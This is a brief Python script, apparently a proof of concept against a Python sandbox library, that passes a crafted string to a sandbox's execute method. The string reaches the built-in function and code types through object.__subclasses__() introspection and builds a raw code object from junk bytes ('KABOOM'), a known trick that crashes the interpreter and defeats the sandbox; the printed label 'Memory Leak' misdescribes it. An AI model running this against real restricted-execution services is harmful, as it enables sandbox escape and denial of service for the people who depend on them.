from __future__ import print_function
from sandbox import Sandbox
import os

sbox=Sandbox()
string ="""
print ("Memory Leak")
(lambda fc=(
    lambda n: [
        c for c in 
            ().__class__.__bases__[0].__subclasses__() 
            if c.__name__ == n
        ][0]
    ):
    fc("function")(
        fc("code")(
            0,0,0,0,"KABOOM",(),(),(),"","",0,""
        ),{}
    )()
)()
"""

sbox.execute(string)

